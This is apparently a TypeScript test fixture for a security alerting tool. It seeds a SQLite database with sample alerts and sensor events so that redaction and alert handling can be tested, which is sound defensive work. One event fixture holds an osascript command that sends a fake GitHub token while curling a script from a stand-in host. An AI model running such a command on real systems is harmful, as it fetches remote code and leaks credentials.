import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import type { Alert, SensorEvent } from '@vigil/core';

/**
 * A stand-in vigil.db for the MCP tests: the real tables (alerts, events)
 * with the real column shapes — full zod-validated record in `body`, the
 * columns we filter on beside it.
 */

export const NOW = Date.now(); // module-load time: fixtures stay inside the stdio server's real-clock windows
const MINUTE = 60_000;

export const HOSTILE_ALERT_ID = 'alert-hostile-0001';
export const CALM_ALERT_ID = 'alert-calm-00000001';
export const RESOLVED_ALERT_ID = 'alert-resolved-001';
export const BIG_ALERT_ID = 'alert-big-evidence';
export const MISSING_ID = 'alert-nothing-here';

/** A GitHub token shaped like the real thing — the redactor must never pass it. */
export const FIXTURE_TOKEN = 'ghp_' + 'a'.repeat(36);
/** A marker planted in the oversize evidence — no fragment of it may ever leave. */
export const OVERSIZE_MARKER = 'MYSUPERSECRETTOKEN-do-not-ship-4f2b';

export function hostileAlert(): Alert {
  return {
    id: HOSTILE_ALERT_ID,
    createdAt: NOW - 5 * MINUTE,
    updatedAt: NOW - 4 * MINUTE,
    ruleId: 'persistence.unsigned-launch-agent',
    ruleVersion: 3,
    title: 'Unsigned launch agent on alice-macbook.local persisted',
    summary: 'A process wrote a launch agent, and no signature covers it.',
    severity: 'high',
    fidelity: 'high',
    notify: 'popup',
    status: 'open',
    containment: 'none',
    eventIds: ['evt-hostile-1'],
    actionIds: [],
    subject: {
      kind: 'file',
      label: 'agent-alice-holland.plist',
      path: '/Users/alice-holland/Library/LaunchAgents/agent-alice-holland.plist',
    },
  };
}

export function calmAlert(): Alert {
  return {
    id: CALM_ALERT_ID,
    createdAt: NOW - 2 * 60 * MINUTE,
    updatedAt: NOW - 2 * 60 * MINUTE,
    ruleId: 'network.odd-port',
    ruleVersion: 1,
    title: 'Outbound connection on an unusual port',
    summary: 'A background process reached out on port 4444.',
    severity: 'info',
    fidelity: 'medium',
    notify: 'badge',
    status: 'open',
    containment: 'none',
    eventIds: ['evt-calm-1'],
    actionIds: [],
  };
}

export function resolvedAlert(): Alert {
  return {
    ...calmAlert(),
    id: RESOLVED_ALERT_ID,
    createdAt: NOW - 3 * 60 * MINUTE,
    updatedAt: NOW - 60 * MINUTE,
    status: 'resolved',
  };
}

export function bigAlert(): Alert {
  return {
    id: BIG_ALERT_ID,
    createdAt: NOW - MINUTE,
    updatedAt: NOW - MINUTE,
    ruleId: 'process.suspicious-exec',
    ruleVersion: 7,
    title: 'Suspicious process launch',
    summary: 'A process ran with arguments that look like an attack.',
    severity: 'critical',
    fidelity: 'high',
    notify: 'popup',
    status: 'open',
    containment: 'active',
    eventIds: ['evt-big-1'],
    actionIds: [],
  };
}

export function execEvent(over: Partial<SensorEvent> = {}): SensorEvent {
  return {
    id: 'evt-hostile-1',
    ts: NOW - 5 * MINUTE,
    source: 'santa',
    kind: 'process.exec',
    process: {
      pid: 8421,
      startTime: NOW - 5 * MINUTE,
      path: '/usr/bin/osascript',
      args: [
        '-e',
        'do shell script "curl -H \\"Authorization: Bearer ' +
          FIXTURE_TOKEN +
          '\\" https://x.example/s.sh"',
      ],
      signing: 'unsigned',
      ancestors: ['zsh', 'iTerm2'],
    },
    ...over,
  } as SensorEvent;
}

/** A sensor record far bigger than the reply cap, with a marker planted mid-secret. */
export function bigEvent(): SensorEvent {
  const filler = 'x'.repeat(96);
  const raw = JSON.stringify({
    log: Array.from({ length: 4000 }, (line, i) => `${filler} row ${i}`).join('\n'),
    buried: OVERSIZE_MARKER + '更多信息',
  });
  return {
    id: 'evt-big-1',
    ts: NOW - MINUTE,
    source: 'osquery',
    kind: 'process.exec',
    raw,
    process: {
      pid: 4242,
      startTime: NOW - MINUTE,
      path: '/tmp/.stealth/run.sh',
      args: ['--password=hunter2'],
      signing: 'unsigned',
      ancestors: ['sh'],
    },
  } as SensorEvent;
}

/** The real alerts/events tables, nothing else. */
export function createSchema(db: DatabaseSync): void {
  db.exec(`
    CREATE TABLE events (
      id TEXT PRIMARY KEY,
      ts INTEGER NOT NULL,
      kind TEXT NOT NULL,
      source TEXT NOT NULL,
      body TEXT NOT NULL
    );
    CREATE INDEX events_ts ON events (ts);
    CREATE TABLE alerts (
      id TEXT PRIMARY KEY,
      created_at INTEGER NOT NULL,
      updated_at INTEGER NOT NULL,
      status TEXT NOT NULL,
      severity TEXT NOT NULL,
      rule_id TEXT NOT NULL,
      body TEXT NOT NULL
    );
    CREATE INDEX alerts_status_created ON alerts (status, created_at);
  `);
}

export function insertAlert(db: DatabaseSync, alert: Alert): void {
  db.prepare(
    'INSERT INTO alerts (id, created_at, updated_at, status, severity, rule_id, body) VALUES (?, ?, ?, ?, ?, ?, ?)',
  ).run(
    alert.id,
    alert.createdAt,
    alert.updatedAt,
    alert.status,
    alert.severity,
    alert.ruleId,
    JSON.stringify(alert),
  );
}

export function insertEvent(db: DatabaseSync, event: SensorEvent): void {
  db.prepare('INSERT INTO events (id, ts, kind, source, body) VALUES (?, ?, ?, ?, ?)').run(
    event.id,
    event.ts,
    event.kind,
    event.source,
    JSON.stringify(event),
  );
}

export function populate(db: DatabaseSync): void {
  insertAlert(db, hostileAlert());
  insertAlert(db, calmAlert());
  insertAlert(db, resolvedAlert());
  insertAlert(db, bigAlert());
  for (const event of [
    execEvent(),
    { ...execEvent(), id: 'evt-calm-1', ts: NOW - 2 * 60 * MINUTE },
  ]) {
    insertEvent(db, event);
  }
  insertEvent(db, bigEvent());
}

/**
 * A fixture database file, populated. The caller removes the directory.
 * Returns { path, dir }.
 */
export function fixtureFileDb(): { path: string; dir: string } {
  const dir = mkdtempSync(join(tmpdir(), 'vah-soc-mcp-'));
  const path = join(dir, 'vigil.db');
  const db = new DatabaseSync(path);
  createSchema(db);
  populate(db);
  db.close();
  return { path, dir };
}

/** A fresh in-memory fixture database. */
export function fixtureMemoryDb(): DatabaseSync {
  const db = new DatabaseSync(':memory:');
  createSchema(db);
  populate(db);
  return db;
}

export function removeFixtureDb(dir: string): void {
  rmSync(dir, { recursive: true, force: true });
}
